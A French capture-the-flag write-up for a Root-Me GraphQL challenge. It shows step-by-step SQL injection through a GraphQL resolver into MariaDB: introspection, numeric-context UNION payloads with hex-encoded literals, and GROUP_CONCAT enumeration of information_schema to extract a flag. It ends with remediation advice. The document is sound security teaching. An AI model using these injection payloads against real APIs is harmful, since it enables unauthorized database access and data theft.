# Root-Me — GraphQL - Backend injection (GQLi)

**Catégorie :** Web - Serveur
**Difficulté :** moyenne
**Endpoint :** `POST http://challenge01.root-me.org:<port>/rocketql`
**Type de faille :** injection SQL (MariaDB) à travers un resolver GraphQL, en contexte numérique

---

## 1. Résumé

L'application expose une API GraphQL sur `/rocketql` permettant de consulter des
lanceurs spatiaux (« rockets »). L'un des resolvers insère un argument fourni par
l'utilisateur **directement** dans une requête SQL, sans paramétrage. En exploitant
une injection SQL de type `UNION`, on énumère les bases, on découvre une base
`secret_db` contenant une table `flag`, et on en extrait la colonne `value`.

Point remarquable du challenge : l'injection se fait dans un **contexte numérique**
(valeur non entourée d'apostrophes côté SQL), ce qui rend l'apostrophe contre-productive
et impose d'encoder toute chaîne littérale en hexadécimal. De plus, la charge doit rester
valide à travers **trois couches** successives (JSON → GraphQL → SQL), ce qui est la
principale source d'erreurs lors de l'exploitation.

---

## 2. Reconnaissance

### 2.1 Introspection du schéma

L'introspection GraphQL est active. Elle livre la carte complète de l'API :

```json
{"query":"{ __schema { queryType { name } types { kind name fields { name args { name type { kind name ofType { kind name } } } } } } }"}
```

Points de sortie (`RootQueryType`) :

| Query | Arguments | Retour |
|-------|-----------|--------|
| `rocket` | `id: ID` | un `Rocket` |
| `rockets` | `name: String`, `country: String`, `is_active: Int` | liste de `Rocket` |

Type `Rocket` : `id`, `name`, `country`, `is_active`. **Aucune mutation.**

### 2.2 Lecture du schéma pour l'injection

Deux critères désignent les paramètres susceptibles d'être injectables :

- **Le type.** Les `String` laissent passer n'importe quel caractère ; `is_active`
  est un `Int`, donc GraphQL rejette tout ce qui n'est pas entier avant même le
  resolver. `id` est un `ID` qui accepte aussi bien un entier qu'une chaîne.
- **Le rôle.** Un argument de filtre/recherche/identifiant est presque sûrement
  réinjecté dans une requête backend.

Candidats retenus : `name`, `country` (filtres texte) et `id` (identifiant).

### 2.3 Un indice dans le cookie

Le cookie `profile` est encodé en base64 :

```
eyJ1c2VyTmFtZSI6InRlc3QiLCJwYXNzV29yZCI6InRlc3QifQ==
→ {"userName":"test","passWord":"test"}
```

La casse inhabituelle (`userName`, `passWord`) suggère des noms de champs réels
côté backend — piste à garder en tête.

---

## 3. Le piège des trois couches (JSON → GraphQL → SQL)

La plus grosse difficulté n'est pas le SQL, mais le fait que la charge traverse
**trois grammaires empilées**. Une erreur à n'importe quel niveau arrête la requête
avant qu'elle n'atteigne la base.

| Couche | Erreur typique rencontrée | Rôle |
|--------|---------------------------|------|
| JSON (body) | `Bad escaped character in JSON at position N` | transport |
| GraphQL (parseur) | `Syntax Error: Unterminated string` / `Unexpected single quote` | grammaire de la requête |
| SQL (MariaDB) | `ER_PARSE_ERROR ... near '...'` | **la cible** |

Règles d'échappement à respecter :

- **L'apostrophe `'` ne s'échappe jamais** ni en JSON ni en GraphQL. Écrire `\'`
  provoque `Bad escaped character in JSON`.
- Un guillemet double littéral dans la valeur GraphQL s'écrit `\"` en JSON ; à
  l'intérieur de la chaîne GraphQL, pour le SQL, il faudrait `\\\"`.
- Rien ne doit traîner **après** l'accolade fermante `}` du document GraphQL.

Exemple de charge correcte (apostrophe nue, à l'intérieur de la chaîne) :

```json
{"query":"{ rockets(country: \"'\") { name, country, is_active } }"}
```

Tant qu'on obtient un `400` avec une erreur JSON ou GraphQL, on n'a **rien** testé
côté backend.

---

## 4. Identification du backend

### 4.1 Fausse piste NoSQL

L'apostrophe injectée dans `name`/`country` ne produisait pas d'erreur SQL exploitable,
ce qui a d'abord fait envisager un backend NoSQL (MongoDB, injection via `$where`).
Cette piste s'est révélée fausse.

### 4.2 Confirmation MariaDB

En injectant sur le paramètre `id`, le serveur renvoie une vraie erreur moteur :

```
ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that
corresponds to your MariaDB server version for the right syntax to use
near ''-- - LIMIT 1' at line 1
```

Double enseignement :

1. Le backend est **MariaDB** (SQL), pas NoSQL.
2. La charge atteint le SQL et le casse → **injection confirmée**.

### 4.3 Contexte numérique (le point clé)

L'erreur affiche `near '...' LIMIT 1`, et surtout l'injection renvoyait **toujours
la même erreur quelle que soit la charge** dès qu'elle contenait une apostrophe. En
reconstituant le gabarit :

```sql
SELECT ... FROM rockets WHERE id = <input> LIMIT 1
```

La valeur `id` est insérée **nue, sans apostrophes encadrantes** : c'est un
**contexte numérique**. Une apostrophe ouvre donc une chaîne SQL jamais refermée
(`WHERE id = 0'-- -` → chaîne non terminée), ce qui explique l'erreur systématique.

**Conséquence majeure :** on injecte sans aucune apostrophe, et toute chaîne littérale
devra être fournie en hexadécimal (`0x...`).

---

## 5. Exploitation par UNION

### 5.1 Neutraliser la fin de requête

Le `LIMIT 1` en fin de gabarit se commente avec `-- -` (sans apostrophe) :

```json
{"query":"{ rocket(id: \"1-- -\") { name, country, is_active } }"}
```

### 5.2 Nombre de colonnes

Via `ORDER BY`, par dichotomie :

```json
{"query":"{ rocket(id: \"1 ORDER BY 4-- -\") { name } }"}
```

`ORDER BY 10` → `Unknown column '10' in 'order clause'`, `ORDER BY 4` passe,
`ORDER BY 5` casse → **4 colonnes** (cohérent avec `id, name, country, is_active`).

### 5.3 Le piège du resolver au singulier

Première tentative avec un `id` existant :

```json
{"query":"{ rocket(id: \"10 UNION SELECT 1,2,3,4-- -\") { name, country, is_active } }"}
→ {"data":{"rocket":{"name":"Electron","country":"New Zealand","is_active":1}}}
```

La ligne injectée n'apparaît pas : le resolver `rocket` est au **singulier** et ne
retourne que la **première** ligne (`results[0]`). Comme `id = 10` existe, la vraie
fusée occupe cette place.

**Correctif :** utiliser un `id` inexistant (`0`, `-1`…) pour que la ligne du `UNION`
soit la seule, donc la première retournée.

### 5.4 Repérage des colonnes affichées

```json
{"query":"{ rocket(id: \"0 UNION SELECT 1,2,3,4-- -\") { name, country, is_active } }"}
```

Résultat : position **2 → champ `name`**, position **3 → champ `country`**. On place
donc les données à exfiltrer en position 2 ou 3.

---

## 6. Énumération et extraction

Toutes les chaînes littérales sont encodées en hexadécimal pour éviter l'apostrophe.
`GROUP_CONCAT` permet de ramener plusieurs lignes dans une seule cellule (le resolver
n'en affichant qu'une).

### 6.1 Lister les bases

```json
{"query":"{ rocket(id: \"0 UNION SELECT 1,2,GROUP_CONCAT(0x7c,schema_name,0x7c),4 FROM information_schema.schemata-- -\") { name, country, is_active } }"}
```

```
country: "|information_schema|,|graphql_db|,|secret_db|"
```

→ La base intéressante est **`secret_db`**.

### 6.2 Lister les tables de `secret_db`

`secret_db` = `0x7365637265745f6462`

```json
{"query":"{ rocket(id: \"0 UNION SELECT 1,2,GROUP_CONCAT(0x7c,table_name,0x7c),4 FROM information_schema.tables WHERE table_schema=0x7365637265745f6462-- -\") { name, country, is_active } }"}
```

```
country: "|flag|"
```

### 6.3 Lister les colonnes de `flag`

`flag` = `0x666c6167`

```json
{"query":"{ rocket(id: \"0 UNION SELECT 1,2,GROUP_CONCAT(0x7c,column_name,0x7c),4 FROM information_schema.columns WHERE table_name=0x666c6167-- -\") { name, country, is_active } }"}
```

```
country: "|id|,|value|"
```

### 6.4 Extraire le flag

La table étant dans une **autre base**, on la préfixe (`secret_db.flag`) :

```json
{"query":"{ rocket(id: \"0 UNION SELECT 1,2,GROUP_CONCAT(0x7c,value,0x7c),4 FROM secret_db.flag-- -\") { name, country, is_active } }"}
```

Le flag apparaît dans le champ `country`.

> Variante si la valeur semble tronquée (limite par défaut de `GROUP_CONCAT`) :
> `0 UNION SELECT 1,2,value,4 FROM secret_db.flag-- -`

---

## 7. Pourquoi sqlmap échoue ici

Tenter d'automatiser avec sqlmap (`-p` + marqueur `*`, `--technique=U`,
`--prefix`/`--suffix`, `--union-cols=4`, `--dbms=mysql`) renvoie **50 × `400 Bad Request`**
alors que les payloads générés sont pourtant du SQL correct :

```
0  UNION ALL SELECT 41,41,41,CONCAT(0x716b...,...)-- -
```

La raison n'est pas le SQL mais les **couches supérieures** : sqlmap insère des
caractères (guillemets doubles, etc.) qui cassent la chaîne GraphQL ou le JSON **avant**
d'atteindre la base (ses sondes heuristiques `0 ).()".,('` et `0 'Vvwd...<'">` en sont
l'illustration). Il n'applique pas le double échappement requis (`"` → `\"` en GraphQL,
puis `\\\"` en JSON), et il n'existe pas de tamper standard pour ré-encapsuler
JSON+GraphQL.

**Conclusion pratique :** sur ce type de cible à double encapsulation, l'exploitation
manuelle (contexte numérique + hex + `GROUP_CONCAT`) est plus rapide et plus fiable
qu'une automatisation sqlmap.

---

## 8. Remédiation

- **Requêtes paramétrées / préparées** dans chaque resolver : ne jamais concaténer
  un argument dans une requête SQL. C'est la correction de fond.
- **Validation de type stricte** : un `id` doit être casté/validé en entier avant usage.
- **Désactiver l'introspection** en production pour réduire la surface de reconnaissance.
- **Principe du moindre privilège** : le compte applicatif ne devrait pas pouvoir lire
  `information_schema` ni une base `secret_db` sans rapport avec son périmètre.
- **Ne pas renvoyer les erreurs moteur** (`ER_PARSE_ERROR`, messages MariaDB) au client :
  elles ont confirmé la faille et le SGBD.

---

## 9. À retenir

1. GraphQL n'est qu'une **couche d'interface** : la vraie faille vit dans le resolver
   et le backend qu'il interroge.
2. Toujours distinguer les **trois couches** JSON / GraphQL / SQL ; identifier à quel
   niveau une erreur est levée avant de conclure.
3. Déterminer le **contexte d'injection** (chaîne vs numérique) avant tout : il décide
   si l'apostrophe est utile ou nuisible. Ici, elle était nuisible.
4. En contexte numérique, encoder les littéraux en **hexadécimal** supprime le besoin
   d'apostrophe.
5. Un resolver « au singulier » ne renvoyant qu'une ligne impose un **id inexistant**
   pour exfiltrer via `UNION`.
6. L'automatisation (sqlmap) n'est pas toujours le chemin le plus court face à une
   **double encapsulation** ; la reconnaissance manuelle paie.
